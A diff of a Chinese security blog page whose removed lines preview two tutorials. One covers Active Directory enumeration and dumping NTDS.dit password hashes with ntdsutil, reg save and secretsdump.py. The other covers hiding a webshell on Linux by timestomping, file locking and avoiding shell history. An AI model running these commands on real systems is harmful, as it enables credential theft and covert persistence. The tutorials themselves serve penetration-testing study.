@@ -6,15 +6,48 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://example.com">
-  <title>Solkatt的小窝</title>
+  <title>内网穿透 | Solkatt的小窝</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Solkatt的小窝">
-<meta property="og:url" content="https://example.com/index.html">
+  <meta name="description" content="内网穿透的概念内网穿透，也叫NAT穿透，进行NAT穿透是为了使具有某一个特定源ip地址和源端口号的数据包不被NAT设备屏蔽而正确路由到内网主机 正向代理和反向代理什么是代理代理就是中介，A和B之间有一个中间C，C就是中介。 刚开始的时候，代理多数是帮助内网client访问外网server用的，后来出现了反向代理，“反向”这个词在这儿的意思是指方向相反，即代理将来自外网客户端的请求转发到内网服务器，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网穿透">
+<meta property="og:url" content="https://example.com/2022/02/21/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/index.html">
 <meta property="og:site_name" content="Solkatt的小窝">
+<meta property="og:description" content="内网穿透的概念内网穿透，也叫NAT穿透，进行NAT穿透是为了使具有某一个特定源ip地址和源端口号的数据包不被NAT设备屏蔽而正确路由到内网主机 正向代理和反向代理什么是代理代理就是中介，A和B之间有一个中间C，C就是中介。 刚开始的时候，代理多数是帮助内网client访问外网server用的，后来出现了反向代理，“反向”这个词在这儿的意思是指方向相反，即代理将来自外网客户端的请求转发到内网服务器，">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220221142927845.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220221145913060.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220221163856317.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220221164751537.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220221165915365.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220221172004023.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220221172841289.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220221173418853.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220221174406245.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220221174751132.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220221175848238.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220221175857524.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220221181140138.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220221181242396.png">
+<meta property="og:image" content="c:/Users/59559/AppData/Roaming/Typora/typora-user-images/image-20220221181343812.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220221181511904.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220222163909757.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220222164009222.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220222164605983.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220222164855369.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220222164914242.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220222172026692.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220222172238410.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220222172352241.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220222172604414.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220222172710014.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220222172853565.png">
+<meta property="article:published_time" content="2022-02-21T08:12:49.000Z">
+<meta property="article:modified_time" content="2022-02-22T09:35:14.424Z">
 <meta property="article:author" content="Solkatt">
+<meta property="article:tag" content="web安全的杂杂恋">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220221142927845.png">
   
     <link rel="alternative" href="/atom.xml" title="Solkatt的小窝" type="application/atom+xml">
   
@@ -142,16 +175,14 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-    <article id="post-内网穿透" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+            <article id="post-内网穿透" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/02/21/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/">内网穿透</a>
+    <h1 class="article-title" itemprop="name">
+      内网穿透
     </h1>
   
 
@@ -367,16 +398,75 @@
       
 
       
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/02/21/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/">展开全文 >></a>
-        </p>
-      
 
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=https://example.com/2022/02/21/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
       
       <div class="clearfix"></div>
     </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+  
+    <a href="/2022/02/19/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">域内信息搜集</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -396,1153 +486,14 @@
 
 
 
-
-  
-    <article id="post-域内信息搜集" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/02/19/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">域内信息搜集</a>
-    </h1>
-  
-
-        
-        <a href="/2022/02/19/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" class="archive-article-date">
-  	<time datetime="2022-02-19T15:31:41.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-02-19</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="域内信息搜集"><a href="#域内信息搜集" class="headerlink" title="域内信息搜集"></a>域内信息搜集</h1><h1 id="一、判断自己的身份"><a href="#一、判断自己的身份" class="headerlink" title="一、判断自己的身份"></a>一、判断自己的身份</h1><p>判断自己的身份最简单的方式就是whoami</p>
-<p>如果是本地非域用户的话，就是计算机名称/账号</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220219235145684.png" alt="image-20220219235145684"></p>
-<p>如果是域内用户账号的话，就是域名称/账号</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220219235255908.png" alt="image-20220219235255908"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nslookup -qt=ns lab.com  //定位DC</span><br><span class="line">net time /domain //查看时间服务器</span><br><span class="line">hostname //查看本机名字</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220219235536326.png" alt="image-20220219235536326"></p>
-<h1 id="二、定位DC及获取用户、组信息"><a href="#二、定位DC及获取用户、组信息" class="headerlink" title="二、定位DC及获取用户、组信息"></a>二、定位DC及获取用户、组信息</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">net config workstation //查询当前登陆域及登录的用户信息</span><br><span class="line">net user /domain  //查询域内用户</span><br><span class="line">wmic useraccount get /all 查询域内用户的详细信息</span><br><span class="line">net accounts /domain 查看域的密码策略</span><br><span class="line">net user xxx /domain  查看指定域用户lab的详细信息</span><br><span class="line">net view /domain 查看有几个域</span><br><span class="line">net view /domain:xxx 查看域内的主机</span><br><span class="line">net group /domain 查看域里面的组</span><br><span class="line">net group &quot;domainn users&quot; //查看域用户</span><br><span class="line">net group &quot;domain controllers&quot; /domian 查看域控制器</span><br><span class="line">net group &quot;domain computers&quot; /domain查看域内所有主机</span><br><span class="line">net group &quot;domain admins&quot; /domain查看域管理员，该组内的成员对域控拥有完全控制权</span><br><span class="line">net group &quot;enterprise admins&quot; /domain 查看企业管理组，该组内的成员对域控拥有完全控制权</span><br><span class="line">net group &quot;domain guest&quot; /domain 查看域访客组，权限较低</span><br><span class="line">net accounts /domain #查询域密码策略</span><br><span class="line">whoami /user #查看⽤户SID和域SID</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220220001656102.png" alt="image-20220220001656102"></p>
-<p>域的sid是500之前的，用户sid是500</p>
-<p>当你是域控用户的时候可以输入以下命令查询域内信息</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">dsquery user #查询⽬录中的⽤户</span><br><span class="line">dsquery computer #查询⽬录中的主机</span><br><span class="line">dsquery group #查询⽬录中的组</span><br><span class="line">dsquery ou #查询⽬录中的组织单元</span><br><span class="line">dsquery site #查询⽬录中的站点</span><br><span class="line">dsquery server #查询域控</span><br><span class="line">dsquery contact #查询⽬录中的联系⼈</span><br><span class="line">dsquery subnet #查询⽬录中的⼦⽹</span><br><span class="line">dsquery quota #查询⽬录中的配额规定</span><br><span class="line">dsquery partition #查询⽬录中的分区</span><br><span class="line">dsquery server –domain lab.com | dsget server–dnsname –site #搜索域内</span><br><span class="line">域控制器的DNS主机名和站点名</span><br><span class="line">dsquery computer domainroot –name -xp –limit n #搜索域内以-xp结尾的机</span><br><span class="line">器n台</span><br><span class="line">dsquery user domainroot –name admin -limit n #搜索域内以admin开头</span><br><span class="line">的⽤户n个</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="三、登陆历史"><a href="#三、登陆历史" class="headerlink" title="三、登陆历史"></a>三、登陆历史</h1><p>最原始的方式是通过注册表里HKEY_USERS的key值来查询谁登录过本机，同样也调用到了 NetSessionEnum API。但是有以下工具可以帮助我们快速查看</p>
-<h2 id="1-psloggedon-exe"><a href="#1-psloggedon-exe" class="headerlink" title="1.psloggedon.exe"></a>1.psloggedon.exe</h2><p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon">PsLoggedOn - Windows Sysinternals | Microsoft Docs</a></p>
-<p>此工具用于查看本地登录的用户和通过本地计算机或远程计算机资源登录的用户。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psloggedon.exe \\域名</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220220002424852.png" alt="image-20220220002424852"></p>
-<h2 id="2-PVEFindADUser-exe"><a href="#2-PVEFindADUser-exe" class="headerlink" title="2.PVEFindADUser.exe"></a>2.PVEFindADUser.exe</h2><p><a target="_blank" rel="noopener" href="https://github.com/chrisdee/Tools/blob/master/AD/ADFindUsersLoggedOn/PVEFindADUser.exe">Tools/PVEFindADUser.exe at master · chrisdee/Tools · GitHub</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PVEFindADUser.exe -current -target hostname</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220220003159391.png" alt="image-20220220003159391"></p>
-<h2 id="3-Powerview-ps1"><a href="#3-Powerview-ps1" class="headerlink" title="3.Powerview.ps1"></a>3.Powerview.ps1</h2><p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\PowerView.ps1</span><br></pre></td></tr></table></figure>
-
-<p>powerview.ps1是非常全面的，它有如下命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">1. Get-NetDomain 获取当前⽤户所在域的名称</span><br><span class="line">2. Get-NetUser 获取所有⽤户的详细信息</span><br><span class="line">3. Get-NetDomainController 获取所有域控制器的信息</span><br><span class="line">4. Get-NetComputer 获取域内所有机器的详细信息</span><br><span class="line">5. Get-NetPrinter 获取域中所有当前计算机对象的数组</span><br><span class="line">6. Get-NetOU 获取域内的OU信息</span><br><span class="line">7. Get-NetGroup 获取所有域内组和组成员的信息</span><br><span class="line">8. Get-NetGroupMember 获取指定域组中所有当前⽤户的列表</span><br><span class="line">9. Get-NetFileServer 根据SPN获取当前域使⽤的⽂件服务器信息</span><br><span class="line">10. Get-NetShare 获取当前域内所有的⽹络共享信息</span><br><span class="line">11. Get-DFSshare 获取域上所有分发⽂件系统共享的列表</span><br><span class="line">12. Get-NetSubnet 获取域的其他⽹段</span><br><span class="line">13. Get-NetSite 获取域内的当前站点</span><br><span class="line">14. Get-NetDomainTrust 获取当前⽤户域的所有信任</span><br><span class="line">15. Get-NetForestTrust 获取与当前⽤户的域关联的林的所有信任</span><br><span class="line">16. Find-ForeignUser 枚举在其主域之外的组中的⽤户</span><br><span class="line">17. Find-ForeignGroup 枚举域组的所有成员并查找查询域之外的⽤户</span><br><span class="line">18. Invoke-MapDomainTrust 尝试构建所有域信任的关系映射</span><br><span class="line">19. Get-NetLoggedon 获取主动登录到指定服务器的⽤户</span><br><span class="line">20. Get-NetLocalGroup 获取⼀个或多个远程主机上本地组的成员</span><br><span class="line">21. Get-NetSession 获取指定服务器的会话</span><br><span class="line">22. Get-NetRDPSession 获取指定服务器的远程连接</span><br><span class="line">23. Get-NetProcess 获取远程主机的进程</span><br><span class="line">24. Get-UserEvent 获取指定⽤户的⽇志</span><br><span class="line">25. Get-ADObject 获取活动⽬录的对象</span><br><span class="line">26. Get-NetGPO 获取域内所有的组策略对象</span><br><span class="line">27. Get-NetGPOGroup 获取域中设置”受限组”的所有GPO</span><br><span class="line">28. Find-GPOLocation 获取⽤户/组，并通过GPO枚举和关联使其具有有效权限的计</span><br><span class="line">算机</span><br><span class="line">29. Find-GPOComputerAdmin 获取计算机并通过GPO枚举确定谁对其具有管理权限</span><br><span class="line">30. Get-DomainPolicy 获取域默认策略或域控制器策略</span><br><span class="line">31. Get-DomainSID 返回指定域的SID</span><br><span class="line">32. Invoke-UserHunter 获取域⽤户登录的计算机信息及该⽤户是否有本地管理员权</span><br><span class="line">限</span><br><span class="line">33. Invoke-ProcessHunter 通过查询域内所有的机器进程找到特定⽤户</span><br><span class="line">34. Invoke-UserEventHunter 根据⽤户⽇志查询某域⽤户登陆过哪些域机器</span><br><span class="line">35. Invoke-ShareFinder 在本地域中的主机上查找（⾮标准）共享</span><br><span class="line">36. Invoke-FileFinder 在本地域中的主机上查找潜在的敏感⽂件</span><br><span class="line">37. Find-LocalAdminAccess 在域上查找当前⽤户具有本地管理员访问权限的计算机</span><br><span class="line">38. Find-ManagedSecurityGroups 搜索受管理的活动⽬录安全组并标识对其具有写</span><br><span class="line">访问权限的⽤户，即这些组拥有添加或删除成员的能⼒</span><br><span class="line">39. Get-ExploitableSystem 发现系统可能易受常⻅攻击</span><br><span class="line">40. Invoke-EnumerateLocalAdmin 枚举域中所有计算机上本地管理员组的成员</span><br></pre></td></tr></table></figure>
-
-<h1 id="四、域信任关系"><a href="#四、域信任关系" class="headerlink" title="四、域信任关系"></a>四、域信任关系</h1><p>域信任是为了解决多域环境中的跨域资源共享问题而诞生的。两个域之间必须拥有信任关系，才可以访问到对方域内的资源。任何一个新的子域加入到域树之后。这个域会自动信任其上一层的父域，同时父域也会自动信任新子域，而且这些信任具有双向传递性。由于此信任⼯作是通过Kerberos security protocol来完成的，因为也被成为KerberosTrust。</p>
-<p>域信任利⽤DNS服务器定位两个不同⼦域的域控制器，如果两个域中的域控制器都⽆法 找到另⼀个域，那么也就不存在通过域信任关系进⾏跨域资源共享。</p>
-<p>域环境不会⽆条件地接收来⾃其他域的凭证，只会接收来⾃受信任的域的凭证。在默认 情况下,特定 Windows域中的所有⽤户都可以通过该域中的资源进⾏身份验证。通过这种⽅式, 域可以为其⽤户提供对该域中所有资源的安全访问机制。如果⽤户想要访问边界以外的资源, 需要使⽤域信任。 </p>
-<p>域信任关系类型： ● 单向信任 是指在两个域之间创建单向的信任路径，即在⼀个⽅向.上是信任流，在另⼀个⽅向 上是访问流。在受信任域和信任域之间的单向信任中，受信任域内的⽤户或计算机可以访问信 任域中的资源，但信任域内的⽤户却⽆法访问受信任域内的资源。也就是说，若A域信任B 域，那么B域内受信任的主体可以访问A域内信任B域的资源。 ● 双向信任 是指两个单向信任的组合，信任域和受信任域彼此信任，在两个⽅向上都有信任流 和访问流。这意味着，可以从两个⽅向在两个域之间传递身份验证请求。活动⽬录中的所有域 信任关系都是双向可传递的。在创建⼦域时，会在新的⼦域和⽗域之间⾃动创建双向可传递信 任关系。 </p>
-<p>建⽴信任的⽬的是允许来⾃⼀个域的⽤户访问资源（如服务器上的本地管理员组），嵌套在组 中或以其他⽅式使⽤另⼀个域中的安全主体（例如⽤于 AD 对象 ACL ）。 对此有个例外是域 林内信任（存在于同⼀ Active Directory 林中的域信任）——在林中创建的任何域都与林中的 每个其他域保持隐式双向、可传递的信任关系。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest /domain_trusts  //查看域信任信息</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220220004301275.png" alt="image-20220220004301275"></p>
-<h1 id="五、NTDS-dit导出hash"><a href="#五、NTDS-dit导出hash" class="headerlink" title="五、NTDS.dit导出hash"></a>五、NTDS.dit导出hash</h1><p>在活动目录中，所有的数据都保存在域控的ntds.dit文件中。</p>
-<p>ntds.dit是一个二进制文件，文件路径为域控的<code>%SystemRoot%\ntds\ntds.dit</code>。NTDS.dit包含不限于用户名、散列值、组、GPP、OU等活动目录的信息。系统运维人员可以使用VSS（Volumn shadow copy servcice，卷映射拷贝服务）。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">首先在cmd中创建快照</span><br><span class="line">ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220220005025693.png" alt="image-20220220005025693"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用GUID挂在快照</span><br><span class="line">ntdsutil snapshot &quot;mount &#123;刚才的快照序号&#125;&quot; quit quit</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220220005512106.png" alt="image-20220220005512106"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">将挂载文件中的ntds.dit复制出来</span><br><span class="line">copy C:\$SNAP_20220220048_VOLUMEC$\windows\ntds\ntds.dit c:\temp\ntds.dit</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220220005909927.png" alt="image-20220220005909927"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">卸载快照并删除快照</span><br><span class="line">ntdsutil snapshot &quot;mount &#123;序列号&#125;&quot; &quot;delete &#123;序列号&#125;&quot; quit quit</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220220010236881.png" alt="image-20220220010236881"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查询当前系统所有快照</span><br><span class="line">ntdsutil snapshot &quot;List All&quot; quit quit</span><br></pre></td></tr></table></figure>
-
-<p>要想得到域的用户名导出信息等，还需要注册表下的system文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\system c:\system</span><br></pre></td></tr></table></figure>
-
-<p>要想提取ntds.dit的hash也有很多方法，这里就只拿出一点简便的</p>
-<p>使用impack工具包下的secretsdump.py</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py -system system -ntds ntds.dit LOCAL</span><br></pre></td></tr></table></figure>
-
-<p>然后解出来的hash去解密就好了。</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">web安全的杂杂念</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/02/19/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Liunx权限维持" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/02/17/Liunx%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/">Liunx权限维持</a>
-    </h1>
-  
-
-        
-        <a href="/2022/02/17/Liunx%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" class="archive-article-date">
-  	<time datetime="2022-02-17T02:00:52.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-02-17</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="Liunx权限维持"><a href="#Liunx权限维持" class="headerlink" title="Liunx权限维持"></a>Liunx权限维持</h1><p>权限维持是一项必要且需要得技巧，当在外网中打点后，需要保证点的持久性，使团队能够专注于目标，而不会失去指挥和控制服务器的通信。</p>
-<h1 id="隐藏技巧"><a href="#隐藏技巧" class="headerlink" title="隐藏技巧"></a>隐藏技巧</h1><h2 id="修改文件-终端属性"><a href="#修改文件-终端属性" class="headerlink" title="修改文件/终端属性"></a>修改文件/终端属性</h2><p>最常用的手段便是修改文件的生成时间，这里可以利用以下命令来进行修改</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch -r index.php shell.php</span><br></pre></td></tr></table></figure>
-
-<p>touch命令用于修改文件或者目录的时间属性，包括存取时间和更改时间。若文件不存在，系统会建立一个新的文件。</p>
-<h2 id="文件锁定"><a href="#文件锁定" class="headerlink" title="文件锁定"></a>文件锁定</h2><p>在Linux中，使用chattr命令来防止root和其他管理用户误删除和修改重要文件以及目录，此权限是用ls -l查看不出来的。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">chattr +i evil.php #锁定文件</span><br><span class="line">rm -rf evil.php #提示禁止删除文件</span><br><span class="line"></span><br><span class="line">lsattr evil.php #属性查看</span><br><span class="line">chattr -i evil.php #解除锁定</span><br><span class="line">rm -rf evil.php #彻底删除文件</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220217104342667.png" alt="image-20220217104342667"></p>
-<h2 id="历史操作命令"><a href="#历史操作命令" class="headerlink" title="历史操作命令"></a>历史操作命令</h2><p>在shell中执行的命令，不希望被记录在命令行历史中，就可以使用无痕操作模式</p>
-<p>只针对你的工作关闭历史记录</p>
